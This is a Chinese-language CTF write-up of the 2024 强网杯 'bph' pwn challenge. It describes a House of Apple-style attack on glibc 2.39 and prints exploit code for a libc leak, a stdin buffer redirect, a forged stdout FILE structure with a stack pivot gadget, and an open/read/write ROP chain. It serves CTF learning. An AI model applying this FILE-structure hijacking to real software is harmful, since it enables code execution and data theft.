---
title: web选手入门pwn(31) 强网杯 bph (House of Apple 变种)
contest: 强网杯
year: 2024
difficulty: hard
vuln_type: heap_exploit
tags: [glibc-2.39, _IO_FILE, _IO_wfile_jumps, _wide_data, fake-stdout, ORW, setcontext, pivote-gadget]
attack_chain: send A*0x28 触发 printf 残基泄 libc+token边界越界写stdin->_IO_buf_base零字节/伪造stdin->_IO_buf_base=stdout-0x48  _IO_buf_end=stdout+0x200 进入可写区/伪造 fake_stdout 套用 IO_FILE_plus_struct: vtable=jumps_mmap-0x20  _wide_data=stdout-0x48  chain=pivot_gadget(mov rsp, rdx) 触发 _io_wfile_underflow_mmap/stdout+0xe8 处放 ORW ROP
key_payload: pivot_gadget = libc_base + 0x5ef5f  # mov rsp, rdx; ret  jumps_mmap = _IO_wfile_jumps + 0xb0
one_liner: 强网杯 bph，glibc 2.39 House of Apple-style 攻击，通过伪造 _IO_wide_data + chain(pivot) 触发 ORW 链。
lesson: glibc 2.39 移除了 __free_hook/__malloc_hook，但 IO_FILE vtable 攻击依然有效（_IO_wfile_jumps_mmap 不在检查表内）；mov rsp, rdx gadget 把栈迁到 ROP 区域，是 House of Apple 2/3 的核心 pivot 技巧。
quality: high
---

# web选手入门pwn(31) 强网杯 bph

## 漏洞
- `sendafter("token:", "A"*0x28)` 触发 printf 风格输出，0x28 字节覆盖到 token 边界，残留 libc 指针
- 后续 choice=1 → size=stdin+56+1 → content="" 写一字节 0x00 到 `stdin->_IO_buf_base`
- 第三次 sendafter("Choice:", ...) 写 5 个 qword：可重定向 stdin 缓冲区

## 攻击链

### Stage 1: 泄 libc
- `A*0x28` 触发的 printf 把栈上残留的 libc 地址打印出来
- 公式：`libc_N = u64(recvuntil("\x7f")[-6:]+"\x00\x00")`，`libc_base = libc_N - 0xadd9e`

### Stage 2: 改 stdin 缓冲区
```python
# stdin->_IO_buf_base = stdout - 0x48
# stdin->_IO_buf_end = stdout + 0x200
sh.sendafter("Choice:", p64(0x0)*3 + p64(stdout-0x48) + p64(stdout+0x200))
```
之后所有输入会被写入 stdout-0x48 区域，可任意构造 fake stdout。

### Stage 3: 构造 fake_stdout
```python
file1 = IO_FILE_plus_struct()
file1.flags = 0
file1._IO_read_ptr = stdout + 0xe8
file1._IO_read_end = stdout + 0xe9
file1._lock = stdout + 0x300        # writable lock
file1.chain = pivot_gadget           # _wide_vtable->__doallocate
file1._codecvt = stdout
file1._wide_data = stdout - 0x48
file1.vtable = jumps_mmap - 0x20    # _io_wfile_underflow_mmap
```

### Stage 4: ORW ROP
```python
rop_shellcode  = p64(pop_rdi) + p64(stdout+0xe0) + p64(pop_rsi) + p64(0) + p64(open)
rop_shellcode += p64(pop_rdi) + p64(0x3) + p64(pop_rsi) + p64(stdout+0x200) + p64(set_rdx) + p64(read)
rop_shellcode += p64(pop_rdi) + p64(0x1) + p64(pop_rsi) + p64(stdout+0x200) + p64(set_rdx) + p64(write)
fake_stdout = p64(0x0)*9 + bytes(file1) + b"/flag\x00\x00\x00" + rop_shellcode
sh.sendafter("Choice:", fake_stdout)
```

### Pivot 流程
1. 触发 `puts("AAAA")` 之类输出 → 走 `_IO_wfile_underflow_mmap`
2. vtable 跳到 `_io_wfile_underflow_mmap + 0x20`（被 -0x20 偏移到 chain 位置）
3. chain 指向 `mov rsp, rdx; ret` (`0x5ef5f`)
4. rdx 此时是 stdout+0xe8（`_IO_read_ptr` 配的 read 缓冲）
5. rsp 跳到 stdout+0xe8，开始执行 ORW ROP

## 经验提炼
- glibc 2.39 仍然有 IO_FILE 攻击面，关键技巧是 vtable 指向 `_IO_wfile_jumps_mmap` (偏移 0xb0) 等非检查表项
- `chain` 字段在 _wide_data 路径下是 `_wide_vtable->__doallocate` 的调用对象，等同 ROP 入口
- `mov rsp, rdx; ret` 是 House of Apple 2/3 的核心 pivot，需要 libc 中存在（2.39 中为 0x5ef5f）
- `set_rdx = mov dl, 0x65; ret` 用于把 rdx 设为 read/write 的长度参数
